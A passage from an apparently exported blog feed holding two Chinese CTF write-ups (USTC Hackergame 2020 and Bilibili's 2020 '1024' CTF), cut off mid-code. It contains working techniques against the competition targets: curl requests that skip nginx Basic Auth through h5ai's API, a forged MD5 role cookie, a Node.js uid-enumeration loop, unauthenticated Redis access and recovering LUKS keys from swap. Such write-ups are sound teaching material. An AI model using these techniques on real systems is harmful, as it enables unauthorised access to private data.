爆破硬盘映像文件。首先把 img 用 7z 解压出来，然后一个一个分区映像跑：</p>\n<pre><code class=\"hljs bash\">$ ./findaes /path/to/img1.raw</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/19.jpg\" width=\"867\" height=\"480\" class=\"lazy post-img\"></p>\n<p>根据题干「我的家目录是 512 位 AES 加密的」，但是 findaes 找到的都是 AES-256，所以需要从中筛选出一对 offset 相差为 256bit 的 key 进行拼接，因此还需要注意一点，由于 Intel x86_64 的 little-endian、拼接 key 时需要倒序拼接。</p>\n<blockquote><p>其实这一点我还是比较熟悉的，安装 Hackintosh 时注入十六进制的设备属性时需要互换 bit 也是因为 little-endian。</p></blockquote>\n<p>剩下的就是一对一对 key 的用 <code>sudo cryptsetup luksAddKey --master-key-file</code> 试过去，直到成功解密为止。最后用 swap 里的最后一对 key 成功解密了分区并拿到了 flag <code>flag{lets_do_A_c01d_b00t_next_time}</code> （下次试试冷启动吧！），直到看到 flag 才明白本题的思路是 Linux 休眠后会把内存写入 swap 分区中（macOS 则是写入硬盘上的 <code>sleepimage</code> 文件中），因此和之前读过的从内存转储破解全盘加密的思路是完全一致的。最后再给大家推荐 Red Hat 知识库的一篇文章「<a href=\"https://access.redhat.com/solutions/1543373\">How to recover lost LUKS key or passphrase</a>」。</p>\n<h2>超简易的网盘服务器</h2>\n<blockquote>\n<p>…… 小 C 开始思考技术方案：“听说 h5ai 搭建云盘的方案是不错的 … 使用 Basic Auth 可以做访问控制，可以保护<a href=\"http://202.38.93.111:10120/\">根目录</a>下的文件不被非法的访问 … 等等，有一些文件是可以被分享的，需要一个 <a href=\"http://202.38.93.111:10120/Public\">/Public</a> 目录来共享文件！”</p>\n<p>三分钟后，小 C 同学完成了网盘的搭建。他想：“空着总不好，先得在云盘上放点东西！”。犹豫片刻，他掏出了自己珍藏了三个月的 flag 并上传到了云盘的<a href=\"http://202.38.93.111:10120/\">根目录</a>。</p>\n</blockquote>\n<p>这道题我好像是第五个还是第六个解出来的。这道题很多人没做出来还是有点令我惊讶的。</p>\n<p>直接访问「根目录」会提示 401 需要 HTTP Basic Authentication，聪明的 小 C 肯定不会把密码直接暴露出来的。访问 <code>/Public </code>目录却发现了 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_nginx-conf\"><code>dockerfile</code></a> 和 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_dockerfile\"><code>nginx.conf</code></a> 文件。从 dockerfile 中我们可以知道小 C 是怎么搭建的服务，而 <code>nginx.conf</code> 更值得我们关心（已省去无关紧要的部分）：</p>\n<pre><code class=\"hljs nginx\"><span class=\"hljs-attribute\">index</span> index.php index.html /_h5ai/public/index.php;<span class=\"hljs-comment\"># 根目录是私有目录，使用 basic auth 进行认证，只有我（超极致的小 C)自己可以访问</span><span class=\"hljs-attribute\">location</span> / {    <span class=\"hljs-attribute\">auth_basic</span> <span class=\"hljs-string\">\"easy h5ai. For visitors, please refer to public directory at `/Public!`\"</span>;    <span class=\"hljs-attribute\">auth_basic_user_file</span> /etc/nginx/conf.d/htpasswd;}<span class=\"hljs-comment\"># Public 目录是公开的，任何人都可以访问，便于我给大家分享文件</span><span class=\"hljs-attribute\">location</span> /Public {    <span class=\"hljs-attribute\">allow</span> all;    <span class=\"hljs-attribute\">index</span> /Public/_h5ai/public/index.php;}<span class=\"hljs-comment\"># PHP 的 fastcgi 配置，将请求转发给 php-fpm</span><span class=\"hljs-attribute\">location</span> <span class=\"hljs-regexp\">~ \\.php$</span> {         <span class=\"hljs-attribute\">fastcgi_pass</span>   <span class=\"hljs-number\">127.0.0.1:9000</span>;         <span class=\"hljs-attribute\">fastcgi_index</span>  index.php;         <span class=\"hljs-attribute\">fastcgi_param</span>  SCRIPT_FILENAME  $document_root$fastcgi_script_name;         <span class=\"hljs-attribute\">include</span>        fastcgi_params;}</code></pre>\n<p>由于 Nginx 配置文件不是连续匹配，因此访问 <code>.php</code> 结尾的路径是不会触发 401 HTTP Basic Auth 的（应该没有人会天真地试图获取 <code>/etc/nginx/conf.d/htpassword</code> 吧？）。既然如此，我们为什么不直接访问 <code>h5ai</code> 的 <code>index.php</code> 呢？首先让我们请求一下 <code>/Public</code> 目录下的 h5ai 后台页面 <code>/Public/_h5ai/public/index.php</code>：</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/Public/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>那么「根目录」下的 <code>/_h5ai/public/index.php</code> 呢？</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>不出所料，直接访问 <code>index.php</code> 也会返回 200 OK，而不是 401。</p>\n<p>虽然直接访问 <code>/_h5ai/public/index.php</code> 不会返回 401，但是 GET 这个路径默认是返回 h5ai 的后台调试页面。由于 h5ai 是开源的、我们可以前往 <a href=\"https://github.com/lrsjng/h5ai\">h5ai 的 GitHub</a> 对其代码进行审计，发现 <a href=\"https://github.com/lrsjng/h5ai/blob/master/src/_h5ai/private/php/core/class-api.php\">h5ai 提供了一系列 API</a>，可以通过 POST 请求列出目录内容和下载文件。首先试试能不能用 API 列出根目录下的文件内容：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/json;charset=UTF-8'</span> --data-binary <span class=\"hljs-string\">'{\"action\":\"get\",\"items\":{\"href\":\"/\",\"what\":1}}'</span> | jq{  <span class=\"hljs-string\">\"items\"</span>: [    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986831000,      <span class=\"hljs-string\">\"size\"</span>: 789419,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">true</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">true</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/Public/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986830000,      <span class=\"hljs-string\">\"size\"</span>: 396458,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">false</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">false</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/flag.txt\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603489315000,      <span class=\"hljs-string\">\"size\"</span>: 24    }  ]}</code></pre>\n<p>诶嘿嘿，我们看到 <code>/flag.txt</code> 啦！接下来就是用 API 下载 <code>flag.txt</code> 文件了：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/x-www-form-urlencoded'</span> --data-raw <span class=\"hljs-string\">'action=download&amp;as=flag.txt.tar&amp;type=php-tar&amp;baseHref=/&amp;hrefs[0]=/flag.txt'</span> -o flag.txt.tar$ tar xzf flag.txt.tar$ cat flag.txt <span class=\"hljs-comment\"># Flag 到手啦</span></code></pre>\n<h2>超安全的代理服务器</h2>\n<blockquote>\n<p>在 2039 年，爆发了一场史无前例的疫情。为了便于在各地的同学访问某知名大学「裤子大」的网站进行「每日健康打卡」，小 C 同学为大家提供了这样一个代理服务。曾经信息安全专业出身的小 C 决定把这个代理设计成最安全的代理。</p>\n<p><strong>提示：浏览器可能会提示该 TLS 证书无效，与本题解法无关，信任即可。</strong></p>\n</blockquote>\n<p>「浏览器可能会提示该 TLS 证书无效」这句话至关重要。想想看为什么别的题都是通过 HTTP 访问的、唯独这道题要用 HTTPS？什么东西需要 HTTPS 才能工作、在 HTTP 下不工作呢？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/9.png\" width=\"1165\" height=\"294\" class=\"lazy post-img\"></p>\n<p>虽然 HTTP/2 本身不要求 TLS 实现（例如 H2C、HTTP/2 ClearText）、并且有通过 HTTP/1.1 升级到 HTTP/2 的协商方法（参见 <a href=\"https://blog.skk.moe/post/http3-alt-svc/#HTTP-2-%E7%9A%84%E5%8D%8F%E5%95%86%E6%96%B9%E5%BC%8F\">我之前的文章「HTTP/3：HTTP Alternative Services 作为协商方式」中的「HTTP/2 的协商方式」章节</a> ），但是所有支持 HTTP/2 的浏览器都要求 HTTP/2 必须通过 TLS 传输、并在 Client Hello 中通过 ALPN Protocol 进行协商。扯远了，看看题目。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/8.png\" width=\"750\" height=\"400\" class=\"lazy post-img\"></p>\n<p>「我们已经向您 <strong>推送（PUSH）</strong> 了最新的 <strong>Secret</strong> ，但是你可能无法直接看到它」。现在我们知道了，这道题和 HTTP/2 Server Push 有关。解码 HTTP/2 帧最好的方法自然是使用 Wireshark。首先我们要让 Wireshark 能够解密 HTTPS 内容，最简单的方法是使用 <code>SSLKEYLOGFILE</code> 环境变量。</p>\n<blockquote><p>警告！使用 <code>SSLKEYLOGFILE</code> 环境变量非常危险，任何获取该变量的软件都可以随意解密你的 HTTPS 流量！因此，务必仅针对某一需要解密流量的软件、在某一次性 Session 下设置该环境变量！</p></blockquote>\n<p>打开 Chrome，在 <code>chrome://version/</code> 中查看可执行文件路径：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/10.png\" width=\"1196\" height=\"270\" class=\"lazy post-img\"></p>\n<p>然后在终端中通过预设环境变量直接启动 Chrome：</p>\n<pre><code class=\"hljs bash\">SSLKEYLOGFILE=<span class=\"hljs-string\">\"/path/to/ssllog.txt\"</span> <span class=\"hljs-string\">\"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\"</span></code></pre>\n<p>启动 Wireshark 偏好设置中找到 Protocol - TLS、配置 (Pre)-Master-Secret log filename：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/11.png\" width=\"687\" height=\"514\" class=\"lazy post-img\"></p>\n<p>现在，再通过启动的 Chrome 访问「Smart Proxy!」，可以看到 Wireshark 完整解密了 Chrome 的所有 HTTPS 流量。在 Wireshark 中使用下述过滤器找出本题的流量：</p>\n<pre><code class=\"hljs plaintext\">ip.addr == 146.56.228.227</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/12.png\" width=\"1371\" height=\"279\" class=\"lazy post-img\"></p>\n<p>在过滤后的流量中我们很快就可以找到 PUSH_PROMISE 帧、告诉了我们如何获得 secret 和第一个 flag：<code>GET /ebe087a0-68e5-4280-b605-b98b89488e1e</code>。</p>\n<p>获得第一个 flag 后，我们可以在终端中 Ctrl + C 关闭 Chrome。之后从 Dock、桌面、Finder、Spotlight 等方法「正常启动」Chrome 是不会再将 TLS 握手的信息输出到 SSLKEYLOGFILE 的。</p>\n<h2>尾声</h2>\n<p>今年的 USTC Hackergame 对我来说运气的成分远高于能力的成分，不少题目都是侥幸做出来的，而且对 <code>binary</code> 和 <code>math</code> 一窍不通的我这两类题几乎一道题都没做出来；比赛期间甚至收到了主办方邀请提交「非官方题解」，受宠若惊（狐狐暗自高兴）；最后拿到了 3250 分，排名侥幸挤进了前 50、与真正的 CS 大佬和 CTF 师傅们在榜上合影，瑟瑟发抖（非常害怕）。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.9/31.png\" width=\"1109\" height=\"135\" class=\"lazy post-img\"></p>\n<p>没有对比就没有伤害，相比 <a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">两周前 Bilibili 的「1024  程序员节 CTF」</a>，USTC Hackergame 不论是在难度梯度分布、题目水平、趣味性、活动整体质量上都远高一个层次。引用组委会成员「Zihan Zheng」在知乎「<a href=\"https://www.zhihu.com/question/351947330/answer/866177844\">参加中国科学技术大学第六届信息安全大赛（Hackergame 2019）是怎样一种体验？</a>」提问中的回答：</p>\n<blockquote><p>我们举办的 Hackergame 的初衷就是对新人友好，增加趣味性，强调教育意义。我看到有些同学反馈说题目偏简单、逆向题偏少等等，我想强调，我们这个比赛虽然是提交 flag 的形式，但<strong>不是 CTF 比赛，不会与国内外的 CTF 比赛对标</strong>。我们会把这个特色坚持下去，希望大家不要从经验丰富的 CTF 选手视角来评价我们的比赛。</p></blockquote>\n<p>如果说 Hackergame 的初衷是「对新人友好，增加趣味性，强调教育意义」，IMHO 不论是 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">往届</a> 还是今年的比赛都完美达成了这一点；毫无疑问地，明年的比赛我依然会参加。最后当然是要在「尾声」中喊一句口号：</p>\n<blockquote><p>「我有一个绝妙的解法，可惜我号太少，说不出来」</p></blockquote>\n<div class=\"license\"> <div class=\"license-title\">USTC Hackergame 2020（中科大信安赛）write up</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hackergame-2020-write-up/\">https://blog.skk.moe/post/hackergame-2020-write-up/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-11-06</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hackergame-2020-write-up/"},{"title":"Bilibili 2020「1024 程序员节」CTF Write Up","date":"2020-10-25 09:44:00","description":"\n<blockquote><p>周六不放假休息，还在这加班搞 CTF？</p></blockquote>\n<p>10 月 24 日不睡觉、凌晨两点钟我还在水群，结果在 USTC@LUG 的群里看见有人在打 Bilibili 的 CTF。我刚刚好一年（指 370 天）没有打过 CTF 了（上一次打正式的 CTF 还是去年参加的 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">USTC Hackergame 2019</a>），所以想着来玩玩。虽然 CTF 结束之前不应该分享和公开 Write Up 和题解，不过 Bilibili 这 CTF 既然这么离谱，那我也没必要按照常理出牌。</p>\n<span></span><blockquote><p>本文更新于 2020 年 10 月 25 日下午 6 点（China Standard Time）。</p></blockquote>\n<p>由于这次 Bilibili 的 CTF 题实在没有什么存档研究的必要，我的 Write Up 里就留一些代码片段和截图，大家也没有复盘的必要。</p>\n<h2>页面的背后是什么 &amp; 真正的秘密只有特殊的设备才能看到</h2>\n<p>一个页面，两道题。打开来就是这个页面：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/1.png\" width=\"1901\" height=\"720\" class=\"lazy post-img\"></p>\n<p>curl 太慢了而且没有代码高亮、直接在地址栏通过 <code>view-source:</code> 看看源码，把 JavaScript 拿出来：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/admin\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            <span class=\"hljs-keyword\">var</span> input = <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"flag1\"</span>);            input.value = <span class=\"hljs-built_in\">String</span>(data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag1'</span>).html(<span class=\"hljs-string\">\"接口异常，请稍后再试～\"</span>);        }    }})</code></pre>\n<p>所以第一题的 Flag 就是 <code>GET /api/admin</code> 了。在页面上 <code>#flag1</code> 元素是被包裹在一个 <code>display: none</code> 的容器里的，不过审查元素或者直接请求访问 API 都能拿到第一题的 Flag。</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/2\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"flag2: \"</span> + data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"需要使用bilibili Security Browser浏览器访问～\"</span>);        }    }})</code></pre>\n<p>第二题要求用「bilibili Security Browser」访问，有没有让你想起来前年 USTC Hackergame 2018 的「黑曜石浏览器」？</p>\n<p>直接用 <code>bilibili Security Browser</code> 作为 User-Agent 请求 API 即可获得 Flag，注意别忘了带上 <code>Session</code> 这个 Cookie，这个是 Bilibili 账户登录状态。</p>\n<blockquote>\n<p>Chromium Based 浏览器本身内置了修改了 User-Agent 的功能。打开 DevTools 的设置菜单、在「Devices」里添加一个新的设备，此处可以指定 User-Agent：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/2.png\" width=\"830\" height=\"301\" class=\"lazy post-img\"></p>\n<p>之后就可以使用「bilibili Security Browser」访问了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/3.png\" width=\"751\" height=\"666\" class=\"lazy post-img\"></p>\n</blockquote>\n<h2>密码是啥？</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/4.png\" width=\"1905\" height=\"853\" class=\"lazy post-img\"></p>\n<p>这道题没啥好 Write Up 的，全部靠猜。用户名是 <code>admin</code> 密码是 <code>bilibili</code>。</p>\n<blockquote><p>你这算哪门子 CTF 啊？又不靠社工，真就硬猜？</p></blockquote>\n<p>以及，你给我翻译翻译，什么叫做 falg？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/5.png\" width=\"431\" height=\"731\" class=\"lazy post-img\"></p>\n<h2>对不起，权限不足～</h2>\n<p>首次访问：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/6.png\" width=\"1899\" height=\"543\" class=\"lazy post-img\"></p>\n<p>刷新一次：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/7.png\" width=\"1901\" height=\"538\" class=\"lazy post-img\"></p>\n<p>有趣，看一下源代码：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/4\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-built_in\">console</span>.log(data);        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～答案是 : {{ \"</span> + data.data + <span class=\"hljs-string\">\" }}\"</span>.toLowerCase() )        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"有些秘密只有超级管理员才能看见哦~\"</span>)        }    }})</code></pre>\n<p>又是 API 返回 flag，用手指头想都知道鉴权是 Cookie 做的，打开 F12 查看 Cookie：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/8.png\" width=\"646\" height=\"46\" class=\"lazy post-img\"></p>\n<p>两个 Cookie，一个是 <code>session</code>，是 Bilibili 账户登录状态的 cookie；另一个是 <code>role</code>，毫无疑问就是我们下手的对象：</p>\n<pre><code class=\"hljs plaintext\">role=ee11cbb19052e40b07aac0ca060c23ee</code></pre>\n<p>打 CTF 的人应该早就把这一串刻进 DNA 里了。即使不知道这串字符是什么东西，丢进搜索引擎后也会知道这是 <code>user</code> 的 MD5。接下来思路就很清晰了，通过将 <code>role</code> 的 Cookie 改成另一串 MD5 即可。</p>\n<p>不过这就是这道题离谱的地方了，这道题要把 <code>role</code> 改成 <code>Administrator</code> 的 MD5（你没有看错，首字母是大写的）：</p>\n<pre><code class=\"hljs plaintext\">role=7b7bc2512ee1fedcd76bdc68926d4f7b</code></pre>\n<p>改好 Cookie 刷新页面就可以拿到 flag 了。</p>\n<h2>别人的秘密</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/9.png\" width=\"1897\" height=\"512\" class=\"lazy post-img\"></p>\n<pre><code class=\"hljs js\">$(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{    (<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">$</span>) </span>{        $.getUrlParam = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">name</span>) </span>{            <span class=\"hljs-keyword\">var</span> reg = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">RegExp</span>(<span class=\"hljs-string\">\"(^|&amp;)\"</span> + name + <span class=\"hljs-string\">\"=([^&amp;]*)(&amp;|$)\"</span>);            <span class=\"hljs-keyword\">var</span> r = <span class=\"hljs-built_in\">window</span>.location.search.substr(<span class=\"hljs-number\">1</span>).match(reg);            <span class=\"hljs-keyword\">if</span> (r != <span class=\"hljs-literal\">null</span>) <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">unescape</span>(r[<span class=\"hljs-number\">2</span>]); <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">null</span>;        }    })(jQuery);    <span class=\"hljs-keyword\">var</span> uid = $.getUrlParam(<span class=\"hljs-string\">'uid'</span>);    <span class=\"hljs-keyword\">if</span> (uid == <span class=\"hljs-literal\">null</span>) {        uid = <span class=\"hljs-number\">100336889</span>;    }    $.ajax({        <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/5?uid=\"</span> + uid,        <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,        <span class=\"hljs-attr\">success</span>: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{            <span class=\"hljs-built_in\">console</span>.log(data);            <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>) {                <span class=\"hljs-comment\">// 如果有值：前端跳转</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～flag : \"</span> + data.data)            } <span class=\"hljs-keyword\">else</span> {                <span class=\"hljs-comment\">// 如果没值</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"这里没有你想要的答案～\"</span>)            }        }    })});</code></pre>\n<p>这道题更离谱，上来先在 jQuery 的 <code>$</code> 对象下挂了一个 <code>getUrlParam</code> 方法用来获取 uid、然后还有一个当 uid 不存在时给予默认值的方法（默认值取 <code>100336889</code>），接下来就是 <code>GET /api/ctf/5?uid=${uid}</code>。</p>\n<blockquote><p>千万不要学习本题源码中的方法解析 URL 参数！<code>unescape</code> 不能处理非 ASCII 字符，极易产生乱码，在生产环境中只应使用 WHATWG URL API 的 <code>searchParams</code> ！</p></blockquote>\n<p>这道题没什么好说的，直接遍历就好了，Node.js 解法如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> http = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'http'</span>);<span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">get</span>(<span class=\"hljs-params\">hostname, path</span>) </span>{  <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Promise</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve, reject</span>) =&gt;</span> {    <span class=\"hljs-keyword\">const</span> req = http.request(      { hostname, path, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> },      <span class=\"hljs-function\">(<span class=\"hljs-params\">res</span>) =&gt;</span> {        <span class=\"hljs-keyword\">const</span> body = [];        res.on(<span class=\"hljs-string\">'data'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">chunk</span>) =&gt;</span> { body.push(chunk); });        res.on(<span class=\"hljs-string\">'end'</span>, <span class=\"hljs-function\">() =&gt;</span> {          <span class=\"hljs-keyword\">try</span> {            resolve(Buffer.concat(body).toString());          } <span class=\"hljs-keyword\">catch</span> (e) {            reject(e);          }        });        req.on(<span class=\"hljs-string\">'error'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">err</span>) =&gt;</span> { reject(err); });      }    );    req.setHeader(<span class=\"hljs-string\">'Cookie'</span>, <span class=\"hljs-string\">'session=你的 Session'</span>)    req.end();  });}(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> ip = <span class=\"hljs-string\">'45.113.201.36'</span>; <span class=\"hljs-comment\">// 我也不知道靶机的 IP 为什么会变，可能被打死了</span>  <span class=\"hljs-keyword\">let</span> uid = <span class=\"hljs-number\">100336889</span>;  <span class=\"hljs-keyword\">while</span> (<span class=\"hljs-literal\">true</span>) {    <span class=\"hljs-keyword\">const</span> res = <span class=\"hljs-keyword\">await</span> get(ip, <span class=\"hljs-string\">`/api/ctf/5?uid=<span class=\"hljs-subst\">${uid++}</span>`</span>);    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-built_in\">JSON</span>.parse(res).code === <span class=\"hljs-number\">200</span>) {      <span class=\"hljs-built_in\">console</span>.log(uid, res);      <span class=\"hljs-keyword\">break</span>;    }  }})();</code></pre>\n<p>唯一值得说的是，如果从他给的 UID 默认值（<code>100336889</code>）开始往上刷，很快就刷到了（<code>100336952</code>）。</p>\n<blockquote><p>这我们怎么知道嘛？我反正一开始是从 0 开始刷的，好在我做这道题时是 10 月 24 日凌晨三点、只有几个人在玩，靶机还扛得住，1 亿我真就刷出来了。</p></blockquote>\n<h2>结束亦是开始</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/10.png\" width=\"1443\" height=\"870\" class=\"lazy post-img\"></p>\n<p>一个页面，文章标题、内容、分类、标签全部都是 null；评论框是用 HTML5 表单做的、什么都不能提交；URL 的格式是 <code>/blog/single.php?id=1</code>。</p>\n<p>这道题和 CUIT（成都信息科技大学）有一年 CTF 校内赛的渗透题很类似。那道题也是 <code>single.php?id=1</code>，SQL 提权然后 Get shell 打入内网。所以一开始看到这个 URL 就开始盲猜是 SQL 注入。我当时做到这道题时已经五点了，所以挂上 sqlmap 就去睡觉了，结果并没有做出来这道题（sqlmap 毫无头猪，不过给了疑似存在 Referer 时间戳盲注）。</p>\n<blockquote><p>等做出来第十题后再来看这道题，就觉得非常离谱；到后来做出来的大佬提示大家这是一道脑洞题时，我已经没有心思做下去了。</p></blockquote>\n<p>从第六题开始，所有题目都说「接下来的旅程，需要少年自己去探索啦～」，也就是说接下来所有的题目都是 Web 盲题。</p>\n<h2>第八题</h2>\n<p>这道题要靠 nmap 扫端口扫出来，发现 6379 端口开放，当然就是大家最爱的未设防的 Redis 服务器啦。</p>\n<p>直接通过 redis-cli 连接靶机，一把梭拿到 flag：</p>\n<pre><code class=\"hljs plaintext\">$ redis-cli -h [靶机 IP] -p 637945.113.201.36:6379&gt; keysflag845.113.201.36:6379&gt; get flag8</code></pre>\n<p>值得注意的是，这 Redis Server 很有趣，因为你使用任何其它命令都只会返回 OK：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/11.png\" width=\"406\" height=\"168\" class=\"lazy post-img\"></p>\n<p>所以，这个很可能是个假的 Redis Server、就是个 REPL，<del>也许第九题就是道 pwn 题呢？</del></p>\n<h2>第十题</h2>\n<p>第十题的入口要靠目录爆破，我使用的工具是 <a href=\"https://github.com/maurosoria/dirsearch\">dirsearch</a>：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/12.png\" width=\"833\" height=\"573\" class=\"lazy post-img\"></p>\n<p>直接访问 <code>/test.php</code> 是个 JSFuck，所以直接丢进 Console 就好了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/13.png\" width=\"689\" height=\"145\" class=\"lazy post-img\"></p>\n<blockquote><p>程序员最多的地方 bilibili1024havefun</p></blockquote>\n<p>程序员最多的地方当然是 GitHub 了。去 GitHub 上搜索 <code>bilibili1024havefun</code> 很容易就可以找到这个仓库 <a href=\"https://github.com/interesting-1024/end\">interesting-1024/end</a>：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><span class=\"hljs-comment\">//filename end.php</span><span class=\"hljs-variable\">$bilibili</span> = <span class=\"hljs-string\">\"bilibili1024havefun\"</span>;<span class=\"hljs-variable\">$str</span> = intval(<span 